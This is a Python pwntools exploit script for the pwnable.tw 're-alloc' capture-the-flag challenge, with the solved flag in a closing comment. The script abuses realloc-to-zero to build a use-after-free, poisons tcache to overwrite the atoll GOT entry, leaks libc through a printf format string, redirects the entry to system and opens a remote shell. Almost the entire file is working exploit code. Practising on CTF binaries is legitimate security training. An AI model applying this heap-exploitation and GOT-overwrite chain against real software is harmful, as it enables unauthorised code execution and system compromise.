from pwn import *

local = 0
debug = 0

if local:
	#s = process('./re-alloc', env = { 'LD_PRELOAD' : './libc.so' })
	s = process('./re-alloc_patched')
	if debug:
		gdb.attach(s, gdbscript = '''
			b*0x040137F
			b*0x04013C4
			c
		''')
	else:
		raw_input('DEBUG')
else:
	s = remote('chall.pwnable.tw', 10106)

binary = ELF('re-alloc_patched')
libc = ELF('libc.so')

def allocate(index, size = b'8', data = b'', recvfull = 0):
	s.sendlineafter(b'Your choice: ', b'1')
	s.sendlineafter(b'Index:', index)
	if index == b'0' or index == b'1' or index == b'':
		s.sendlineafter(b'Size:', size)
		s.sendlineafter(b'Data:', data)
		return b''
	else:
		if recvfull:
			return s.recv()
		return s.recvline()


def free(index):
	s.sendlineafter(b'Your choice: ', b'3')
	s.sendlineafter(b'Index:', index)


def reallocate(index, size = b'16', data = b''):
	s.sendlineafter(b'Your choice: ', b'2')
	s.sendlineafter(b'Index:', index)
	s.sendlineafter(b'Size:', size)
	if size != b'0':
		s.sendlineafter(b'Data:', data)


allocate(b'1', b'16')
allocate(b'0', b'16')
free(b'1')
reallocate(b'0', b'0')
reallocate(b'0', b'16', p64(binary.got['atoll']))
allocate(b'1', b'16')
reallocate(b'1', b'48')
free(b'1')
reallocate(b'0', b'64')
free(b'0')

allocate(b'1', b'32')
allocate(b'0', b'32')
free(b'1')
reallocate(b'0', b'0')
reallocate(b'0', b'32', p64(binary.got['atoll']))
allocate(b'1', b'32')
reallocate(b'1', b'80')
free(b'1')
reallocate(b'0', b'96')
free(b'0')

allocate(b'0', b'32', p64(binary.plt['printf']))

libc.address = int(allocate(b'%23$p').strip().decode('utf-8'), 16) - libc.symbols['__libc_start_main'] - 235

log.info('libc base: 0x%x', libc.address)

allocate(b'', b'A' * 8, p64(libc.symbols['system']))

s.sendlineafter(b'Your choice: ', b'/bin/sh\x00')

s.interactive()
#FLAG{r3all0c_the_memory_r3all0c_the_sh3ll}
